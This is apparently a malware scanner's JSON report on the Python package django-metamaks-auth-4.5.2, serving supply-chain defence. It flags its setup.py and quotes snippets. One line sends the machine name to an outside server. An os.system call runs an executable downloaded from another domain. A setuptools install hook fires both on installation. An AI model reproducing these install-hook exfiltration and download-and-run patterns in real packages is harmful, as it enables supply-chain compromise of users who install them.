{
  "package_name": "django-metamaks-auth-4.5.2",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/django-metamaks-auth-4.5.2/django-metamaks-auth-4.5.2/setup.py",
      "file_name": "setup.py",
      "detection_count": 3,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple clear signs of malicious behavior: (1) It collects the COMPUTERNAME environment variable and sends it to an external server (https://linkedopports.com/pyp/resp.php), which is a form of data exfiltration. (2) On Windows systems, it downloads an executable file (ini_file_pyp_41.exe) from another suspicious domain (https://python-release.com/python-install.scr) and executes it using os.system('start '+filename), which is a classic method for delivering and running malware. (3) The malicious actions are triggered automatically after package installation by hooking into the setuptools install command via the PostInstallCommand class and the cmdclass argument in setup(). This is a common technique used in supply chain attacks via malicious Python packages.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "10",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at django-metamaks-auth-4.5.2/setup.py:10",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/django-metamaks-auth-4.5.2/django-metamaks-auth-4.5.2/setup.py",
          "relative_path": "django-metamaks-auth-4.5.2/setup.py"
        },
        {
          "line_number": "26",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(\nname='django-metamaks-auth',\nversion='4.5.2',\ndescription='A very basic firstbasicpyapp',\npython_requires=\">=3.6\",\ninstall_requires=[''],\ntests_require=[],\ncmdclass={'install': PostInstallCommand},\n)",
          "full_match": "* This package is overwriting the 'install' command in setup.py at django-metamaks-auth-4.5.2/setup.py:26",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/django-metamaks-auth-4.5.2/django-metamaks-auth-4.5.2/setup.py",
          "relative_path": "django-metamaks-auth-4.5.2/setup.py"
        },
        {
          "line_number": "16",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system('start '+filename)",
          "full_match": "* This package is executing OS commands in the setup.py file at django-metamaks-auth-4.5.2/setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/django-metamaks-auth-4.5.2/django-metamaks-auth-4.5.2/setup.py",
          "relative_path": "django-metamaks-auth-4.5.2/setup.py"
        }
      ]
    }
  ]
}